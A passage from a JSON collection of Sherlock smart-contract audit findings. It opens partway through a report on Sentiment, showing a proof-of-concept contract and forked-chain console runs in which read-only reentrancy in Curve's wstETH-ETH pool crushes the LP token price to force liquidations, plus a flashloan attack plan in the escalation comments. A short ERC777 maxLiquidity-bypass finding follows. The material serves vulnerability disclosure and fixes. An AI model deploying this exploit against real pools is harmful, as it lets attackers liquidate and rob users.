3\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 3\", fakeSentimentPrice());\n\n    // 4. Curve Withdraw\n    // TODO: This is where profit maximization math will be necessary\n    uint256[2] memory dep2 = [uint256(0), uint256(0)];\n    POOL.remove_liquidity(LP.balanceOf(address(this)), dep2);\n\n    // 6. Check Virtual Price\n    emit Debug(\"Virtual Price 6\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 6\", fakeSentimentPrice());\n\n    // TODO: Check loss in ETH and compare vs wstETH we now have\n    // Loss is there, but should be marginal / imbalance + fees\n    emit Debug(\"Msg.value\", msg.value);\n    emit Debug(\"This Balance\", address(this).balance);\n    emit Debug(\"Delta\", msg.value - address(this).balance);\n\n    emit Debug(\"WstEthBalance\", WSTETH.balanceOf(address(this)));\n  }\n\n  receive() external payable {\n    // 5. Reenter here\n\n    // Check Virtual Price\n    emit Debug(\"Virtual Price 5\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 5\", fakeSentimentPrice());\n  }\n}\n```\n\nHere the Brownie Console for the maximum theoretical attack\n\n```python\n\nweth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\nwhale = accounts.at(\"0x489ee077994b6658eafa855c308275ead8097c4a\", force=True)\n \nweth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\nweth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\nc = VirtualPriceManip.deploy({\"from\": a[0]})\nc.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\n \nFetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\nFetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\nTransaction sent: 0x69a4ee6fba72894d2e6c7ba556a6df8bb2159981e09b7dd947283368628baefa\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  TransparentUpgradeableProxy.transfer confirmed   Block: 42567825   Gas used: 39080 (0.20%)\n\nTransaction sent: 0xfecb0db00b3db0b7b6cf22bc1adc92d16169060ead3a9c13f88a19b0c57fd666\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n  TransparentUpgradeableProxy.withdraw confirmed   Block: 42567826   Gas used: 30937 (0.15%)\n\nTransaction sent: 0x198d4b73e7def112903606efa77c0add9910e7f3e86186e310a0adbfec0adebc\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  VirtualPriceManip.constructor confirmed   Block: 42567827   Gas used: 647070 (3.24%)\n  VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n\nTransaction sent: 0x101e212ca64ed3fc6595c15c30706a8075a010ed866ba5b230cb494f9ac20c5c\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n  VirtualPriceManip.startAttack confirmed   Block: 42567828   Gas used: 354622 (1.77%)\n\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1005466150529603227)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1005466150529603227)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1005678057072654996)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1005678057072654996)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 93457469619424556)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 93457469619424556)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1005678057072654996)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1005678057072654996)]), OrderedDict([('name', 'Msg.value'), ('value', 86826027227418610000000)]), OrderedDict([('name', 'This Balance'), ('value', 83541864626282883099978)]), OrderedDict([('name', 'Delta'), ('value', 3284162601135726900022)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2736183720644597163208)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 81436145961234587181162)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2736183720644597163208)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 81436145961234587181162)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (86826027227418610000000, 0)), ('fees', (11884971933620921875, 9942362504203593908)), ('invariant', 86698045640581035174753), ('token_supply', 86190407433150506590178)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (83541864626282883099978, 2736183720644597163208)), ('fees', (0, 0)), ('token_supply', 4754261471915919409016)])]}\n\n\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n>>> eth_to_convert = 2736183720644597163208 * 1.08\n>>> 3284162601135726900022 - eth_to_convert\n3.290841828395613e+20\n>>> 3.290841828395613e+20 / 86826027227418610000000 * 100\n## 37 BPS to perform the attack, remaining costs would bring it up to around 50 BPS (swap wstETH, cost of liquidations, etc..)\n0.3790155939964975\n\n## See `fakeSentiment5 vs fakeSentimen1`\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n\n\"\"\"\nPrice is 9% of it's original value, we achieve a 10X price depreciation, allowing us to liquidate any user that has taken minimal leverage\n\"\"\"\n\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAt this time, I would recommend NOT to use the ETH-stETH LP Token as the price is manipulatable.\nThe only rational way I could expect this to be solved is for Chainlink to offer virtual_price oracles, or the development of a TWAP for the virtual_price.\n\n\n## Additional Considerations\n\nThe theoretical maximum attack allows to effectively liquidate any account that uses the stETH-WETH Pool.\n\nIn practice, via an AAVE Flashloan I'm able to borrow up to 14.5k WETH, which allows to move the price by over 11%, meaning that some accounts, that are levered at around 90% could be unfairly liquidated.\n\n```python\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1005466094471744332)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1005466094471744332)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1005497298777214105)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1005497298777214105)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 890315892210177531)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 890315892210177531)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1005497298777214105)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1005497298777214105)]), OrderedDict([('name', 'Msg.value'), ('value', 1452330000000000000000)]), OrderedDict([('name', 'This Balance'), ('value', 713314090131700921245)]), OrderedDict([('name', 'Delta'), ('value', 739015909868299078755)]), OrderedDict([('name', 'WstEthBalance'), ('value', 677574531693017948098)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('_value', 1449753409949781400798)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('value', 677574531693017948098)]), OrderedDict([('_from', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 1449753409949781400798)])], 'AddLiquidity': [OrderedDict([('provider', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('token_amounts', (1452330000000000000000, 0)), ('fees', (192842135570862938, 176890872766115807)), ('invariant', 6238313797265075968081), ('token_supply', 6204014881865700809814)])], 'RemoveLiquidity': [OrderedDict([('provider', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('token_amounts', (713314090131700921245, 677574531693017948098)), ('fees', (0, 0)), ('token_supply', 4754261471915919409016)])]}\n>>> 890315892210177531 / 1005466094471744332\n## Around 11.2% Price Manipulation with 14.5k ETH used\n0.8854757978467043\n```\n\nTo put it in simple terms, the cost of this attack is around $90k and it will be profitable to liquidate any position above $100k\n\n## Discussion\n\n**Evert0x**\n\nComment from WatchPug (lead senior)\n\n> We find the issue to be valid.\n> \n> However, the economics of the attack may not be profitable, and the preconditions and requirements for such an attack can be narrow. We also believe that flashloans cannot be utilized as the entrance for the attack: `POOL.remove_liquidity()` will add a reentrancy lock which prevents `remove_liquidity()` on the liquidation impounded lpToken assets.\n> \n> As the revenue/profit from such an attack cannot be used to repay the loan within the same block, flashloans cannot be used.\n\nAlthough the impact is high we judge the issue to be medium severity because of the requirements and conditions described in the comment from WatchPug.\n\n\n**bahurum**\n\nEscalate for 50 USDC. \nI believe the issue has been downgraded incorrectly to medium severity. The lead senior watson justifies the downgrading with 2 arguments, which I would like to dispute both.\n1. **The attack may not be profitable and needs narrow preconditions**: The attack is profitable as in the `Additional Considerations` section, the watson shows by mistake the impact of a 1452 ETH loan instead of 14520 ETH flash-borrowable from Aave on arbitrum (see 'Msg.value' field in debug log). With 14.5k ETH the virtual price would be reduced by 45%, which is much more than 11%. Any account holding a substantial amount of this curve LP and with risky margin will be liquidated (for example if 50 % of collateral is WstETH-ETH curve LP and margin is 20% it will be liquidated). Here is a realistic attack scenario:\n   - The accounts holding the LP token amount to 2M $ in total value and half of them (1M $ value) can be liquidated with 40% manipulation of the LP price\n   - Attacker flash borrows 14k WETH (17M $) and converts to ETH\n   - Attacker calls `add_liquidity` with 16M $ worth of ETH, keeps 1M $ for liquidations\n   - Attacker calls `remove_liquidity` with all LP obtained\n   - On reentrant call:\n        - swaps 1M $ for the required tokens needed for liquidation\n        - liquidates accounts and gets an average liquidation premium of at least 20%, so 200k $ in total\n    - Exit call to attacker's `fallback` or `receive` function\n    - Execution of call to `remove_liquidity` resumes and finishes\n     - Attacker swaps 200k $ worth of stolen tokens back to ETH. Note that WstETH-ETH LP stolen can also be swapped back to ETH since the call to `remove_liquidity` is already exited.\n   - Repay the flashloan and profit. Cost of pool imbalanace + loan is around 0.5 % as shown in the PoC, so about 85k $. Profit is at least 100k $ in this scenario. The attacker doesn't need to provide any funds up front.\n2.  **flashloans cannot be utilized as the entrance for the attack**: This is not true since the WstETH-ETH LP tokens are sent to the attacker during liquidation, which occurs during the call to `remove_liquidity`, but they can be swapped back to ETH after the end of the call to `remove_liquidity` and before the end of the tx. So there is no reentrancy in `remove_liquidity` in this attack. See the scenario above.\n\nIn addition, this bug is well known and probably calls to the pool's `get_virtual_price` are being scanned to find vulnerable contracts, so black hats would have noticed the bug very soon.\n\nFinally, and not related to the escalation, I would like to suggest again a fix as I made some confusion when I suggested it in my own submission:\n\n```diff\n    function getPrice(address token) external view returns (uint) {\n        ICurvePool pool = ICurveLP(token).minter();\n+       uint256[2] calldata amounts;\n+       pool.remove_liquidity(0, amounts);\n        address coin;\n        uint price;\n        uint minPrice = oracleFacade.getPrice(WETH);\n        for(uint i; i<N_COINS; i++) {\n            coin = pool.coins(i);\n            if (coin != ETH) {\n                price = oracleFacade.getPrice(coin);\n                minPrice = (price < minPrice) ? price : minPrice;\n            }\n        }\n\n        return minPrice.mulWadDown(pool.get_virtual_price());\n    }\n```\n\n**sherlock-admin**\n\n > Escalate for 50 USDC. \n> I believe the issue has been downgraded incorrectly to medium severity. The lead senior watson justifies the downgrading with 2 arguments, which I would like to dispute both.\n> 1. **The attack may not be profitable and needs narrow preconditions**: The attack is profitable as in the `Additional Considerations` section, the watson shows by mistake the impact of a 1452 ETH loan instead of 14520 ETH flash-borrowable from Aave on arbitrum (see 'Msg.value' field in debug log). With 14.5k ETH the virtual price would be reduced by 45%, which is much more than 11%. Any account holding a substantial amount of this curve LP and with risky margin will be liquidated (for example if 50 % of collateral is WstETH-ETH curve LP and margin is 20% it will be liquidated). Here is a realistic attack scenario:\n>    - The accounts holding the LP token amount to 2M $ in total value and half of them (1M $ value) can be liquidated with 40% manipulation of the LP price\n>    - Attacker flash borrows 14k WETH (17M $) and converts to ETH\n>    - Attacker calls `add_liquidity` with 16M $ worth of ETH, keeps 1M $ for liquidations\n>    - Attacker calls `remove_liquidity` with all LP obtained\n>    - On reentrant call:\n>         - swaps 1M $ for the required tokens needed for liquidation\n>         - liquidates accounts and gets an average liquidation premium of at least 20%, so 200k $ in total\n>     - Exit call to attacker's `fallback` or `receive` function\n>     - Execution of call to `remove_liquidity` resumes and finishes\n>      - Attacker swaps 200k $ worth of stolen tokens back to ETH. Note that WstETH-ETH LP stolen can also be swapped back to ETH since the call to `remove_liquidity` is already exited.\n>    - Repay the flashloan and profit. Cost of pool imbalanace + loan is around 0.5 % as shown in the PoC, so about 85k $. Profit is at least 100k $ in this scenario. The attacker doesn't need to provide any funds up front.\n> 2.  **flashloans cannot be utilized as the entrance for the attack**: This is not true since the WstETH-ETH LP tokens are sent to the attacker during liquidation, which occurs during the call to `remove_liquidity`, but they can be swapped back to ETH after the end of the call to `remove_liquidity` and before the end of the tx. So there is no reentrancy in `remove_liquidity` in this attack. See the scenario above.\n> \n> In addition, this bug is well known and probably calls to the pool's `get_virtual_price` are being scanned to find vulnerable contracts, so black hats would have noticed the bug very soon.\n> \n> Finally, and not related to the escalation, I would like to suggest again a fix as I made some confusion when I suggested it in my own submission:\n> \n> ```diff\n>     function getPrice(address token) external view returns (uint) {\n>         ICurvePool pool = ICurveLP(token).minter();\n> +       uint256[2] calldata amounts;\n> +       pool.remove_liquidity(0, amounts);\n>         address coin;\n>         uint price;\n>         uint minPrice = oracleFacade.getPrice(WETH);\n>         for(uint i; i<N_COINS; i++) {\n>             coin = pool.coins(i);\n>             if (coin != ETH) {\n>                 price = oracleFacade.getPrice(coin);\n>                 minPrice = (price < minPrice) ? price : minPrice;\n>             }\n>         }\n> \n>         return minPrice.mulWadDown(pool.get_virtual_price());\n>     }\n> ```\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**GalloDaSballo**\n\nEscalate for 50 USDC.\nIn solidarity to my colleague, I re-ran my POC with whale being set to [aWETH](https://arbiscan.io/address/0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8) and you can see that the price impact is closer to 50%\n\n```python\n>>> weth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\nwhale = accounts.at(\"0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8\", force=True)\nFetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\nFetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\n>>> weth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\nweth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\nc = VirtualPriceManip.deploy({\"from\": a[0]})\nc.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\nTransaction sent: 0x986059eea98f64537fc18f576080d9df04a3b1d14566f3f11106d1f443c2a62e\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  TransparentUpgradeableProxy.transfer confirmed   Block: 45350953   Gas used: 39080 (0.20%)\n\nTransaction sent: 0x3aa0e109cf7f7983b6c4123a8befacda921f93969c7f1185e9175d2ad9bfc44c\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n  TransparentUpgradeableProxy.withdraw confirmed   Block: 45350954   Gas used: 30937 (0.15%)\n\nTransaction sent: 0xe4df2473de3a73a7a56b17cdf5acec0cd523f713fcfbbe80a40261f6519a74a3\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  VirtualPriceManip.constructor confirmed   Block: 45350955   Gas used: 647058 (3.24%)\n  VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n\nTransaction sent: 0xa3f759c1c16dffa1dfdc90faceb384d37aa462de39d01dc73ec55ac909f2d27d\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n  VirtualPriceManip.startAttack confirmed   Block: 45350956   Gas used: 346696 (1.73%)\n\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Msg.value'), ('value', 9242544511373299000000)]), OrderedDict([('name', 'This Balance'), ('value', 6887807551730873474275)]), OrderedDict([('name', 'Delta'), ('value', 2354736959642425525725)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2124028976089901491510)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 9136530630863310092133)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2124028976089901491510)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 9136530630863310092133)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (9242544511373299000000, 0)), ('fees', (1143210375408757286, 1031913016221942347)), ('invariant', 15635314996650963717127), ('token_supply', 15533814948437161604759)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (6887807551730873474275, 2124028976089901491510)), ('fees', (0, 0)), ('token_supply', 6397284317573851512626)])]}\n```\n\nMore specifically a 43% loss of value, which would put at risk a sizeable group of normally levered users:\n>>> 1006386728989215731 / 566156151085517748\n1.777578018113242\n>>> (1006386728989215731 - 566156151085517748) / 1006386728989215731 * 100\n43.743678769080375\n\nAlso agree with my colleague that once the liquidation is successful, we can exit the re-entered state and then settle once the `POOL.D` is back to normal, allowing for some price impact (60BPS on estimate), but still profiting by a great margin\n\n**sherlock-admin**\n\n > Escalate for 50 USDC.\n> In solidarity to my colleague, I re-ran my POC with whale being set to [aWETH](https://arbiscan.io/address/0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8) and you can see that the price impact is closer to 50%\n> \n> ```python\n> >>> weth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\n> whale = accounts.at(\"0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8\", force=True)\n> Fetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\n> Fetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\n> >>> weth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\n> weth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\n> c = VirtualPriceManip.deploy({\"from\": a[0]})\n> c.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\n> Transaction sent: 0x986059eea98f64537fc18f576080d9df04a3b1d14566f3f11106d1f443c2a62e\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n>   TransparentUpgradeableProxy.transfer confirmed   Block: 45350953   Gas used: 39080 (0.20%)\n> \n> Transaction sent: 0x3aa0e109cf7f7983b6c4123a8befacda921f93969c7f1185e9175d2ad9bfc44c\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n>   TransparentUpgradeableProxy.withdraw confirmed   Block: 45350954   Gas used: 30937 (0.15%)\n> \n> Transaction sent: 0xe4df2473de3a73a7a56b17cdf5acec0cd523f713fcfbbe80a40261f6519a74a3\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n>   VirtualPriceManip.constructor confirmed   Block: 45350955   Gas used: 647058 (3.24%)\n>   VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n> \n> Transaction sent: 0xa3f759c1c16dffa1dfdc90faceb384d37aa462de39d01dc73ec55ac909f2d27d\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n>   VirtualPriceManip.startAttack confirmed   Block: 45350956   Gas used: 346696 (1.73%)\n> \n> >>> history[-1].events\n> {'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Msg.value'), ('value', 9242544511373299000000)]), OrderedDict([('name', 'This Balance'), ('value', 6887807551730873474275)]), OrderedDict([('name', 'Delta'), ('value', 2354736959642425525725)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2124028976089901491510)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 9136530630863310092133)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2124028976089901491510)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 9136530630863310092133)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (9242544511373299000000, 0)), ('fees', (1143210375408757286, 1031913016221942347)), ('invariant', 15635314996650963717127), ('token_supply', 15533814948437161604759)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (6887807551730873474275, 2124028976089901491510)), ('fees', (0, 0)), ('token_supply', 6397284317573851512626)])]}\n> ```\n> \n> More specifically a 43% loss of value, which would put at risk a sizeable group of normally levered users:\n> >>> 1006386728989215731 / 566156151085517748\n> 1.777578018113242\n> >>> (1006386728989215731 - 566156151085517748) / 1006386728989215731 * 100\n> 43.743678769080375\n> \n> Also agree with my colleague that once the liquidation is successful, we can exit the re-entered state and then settle once the `POOL.D` is back to normal, allowing for some price impact (60BPS on estimate), but still profiting by a great margin\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted \n\nBased on comments & POC in the escalations, the judges consulted the Lead senior and concluded that this issue is a valid high.\n\n**sherlock-admin**\n\n> Escalation accepted \n> \n> Based on comments & POC in the escalations, the judges consulted the Lead senior and concluded that this issue is a valid high.\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the wstETH-ETH Curve LP token, which is priced via its `virtual_price`. Through what Chainalysis called View only Reentrancy, it is possible to reduce the value of `virtual_price`, causing the RiskEngine to trigger a liquidation event. Testing has shown that the debt for such an account is denominated in WETH, and the price of the ETH-wstETH LP Token can be manipulated by calling the RiskEngine while reEntering from the `POOL.remove_liquidity` function. This is possible because the function will send ETH first, before updating its internal wstETH balances. With a big enough deposit, it becomes profitable to force liquidate them, and the estimated cost of the attack is 60 BPS of the total ETH used (due to price impact). The impact of this vulnerability is that it can trigger unfair liquidations to the attacker's advantage. A code snippet and a Brownie Console were provided to demonstrate the maximum theoretical attack. The judges consulted the Lead senior and concluded that this issue is a valid high. Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "report_date": {},
      "contest_prize_txt": "10000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/28",
      "sponsor_name": "Sentiment",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/7",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "28",
      "slug": "h-1-h-01-wsteth-eth-curve-lp-token-price-can-be-manipulated-to-cause-unexpected-liquidations-sherlock-sentiment-sentiment-update-2-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Sentiment Update #2",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Sentiment Update #2",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA Lending"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "Read-only Reentrancy"
          }
        }
      ]
    },
    {
      "id": "3628",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "100",
      "title": "M-2: When tokenX is an ERC777 token, users can bypass maxLiquidity",
      "content": "Source: https://github.com/sherlock-audit/2022-11-buffer-judging/issues/112 \n\n## Found by \ncccz\n\n## Summary\nWhen tokenX is an ERC777 token, users can use callbacks to provide liquidity exceeding maxLiquidity\n## Vulnerability Detail\nIn BufferBinaryPool._provide, when tokenX is an ERC777 token, the tokensToSend function of account will be called in tokenX.transferFrom before sending tokens. When the user calls provide again in tokensToSend, since BufferBinaryPool has not received tokens at this time, totalTokenXBalance() has not increased, and the following checks can be bypassed, so that users can provide liquidity exceeding maxLiquidity.\n```solidity\n         require(\n             balance + tokenXAmount <= maxLiquidity,\n             \"Pool has already reached it's max limit\"\n         );\n```\n## Impact\nusers can provide liquidity exceeding maxLiquidity.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-buffer/blob/main/contracts/contracts/core/BufferBinaryPool.sol#L216-L240\n## Tool used\n\nManual Review\n\n## Recommendation\nChange to\n```diff\n    function _provide(\n        uint256 tokenXAmount,\n        uint256 minMint,\n        address account\n    ) internal returns (uint256 mint) {\n+        bool success = tokenX.transferFrom(\n+            account,\n+            address(this),\n+            tokenXAmount\n+        );\n        uint256 supply = totalSupply();\n        uint256 balance = totalTokenXBalance();\n\n        require(\n            balance + tokenXAmount <= maxLiquidity,\n            \"Pool has already reached it's max limit\"\n        );\n\n        if (supply > 0 && balance > 0)\n            mint = (tokenXAmount * supply) / (balance);\n        else mint = tokenXAmount * INITIAL_RATE;\n\n        require(mint >= minMint, \"Pool: Mint limit is too large\");\n        require(mint > 0, \"Pool: Amount is too small\");\n\n-        bool success = tokenX.transferFrom(\n-            account,\n-            address(this),\n-            tokenXAmount\n-        );\n```\n\n## Discussion\n\n**0x00052**\n\nNeither tokenX (USDC or BFR) are ERC777, so not applicable to current contracts. Something to consider if the team plans to add and ERC777",
      "summary": "\nThis bug report is about an issue found in the BufferBinaryPool._provide function when tokenX is an ERC777 token. It was found by cccz and the vulnerability detail is that when the user calls provide again in tokensToSend, since BufferBinaryPool has not received tokens at this time, totalTokenXBalance() has not increased, and the checks can be bypassed, so that users can provide liquidity exceeding maxLiquidity. The impact of this is that users can provide liquidity exceeding maxLiquidity. The tool used was Manual Review and the recommendation is to change the code snippet to the one provided. Lastly, it was discussed that neither tokenX (USDC or BFR) are ERC777, so not applicable to current contracts.",
      "report_date": {},
      "contest_prize_txt": "21800 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/24",
      "sponsor_name": "Buffer Finance",
      "sponsor_link": "",
      "quality_score": 3,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-buffer-judging/issues/112",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "24",
      "slug": "m-2-when-tokenx-is-an-erc777-token-users-can-bypass-maxliquidity-sherlock-buffer-finance-buffer-finance-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Buffer Finance",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Buffer Finance",
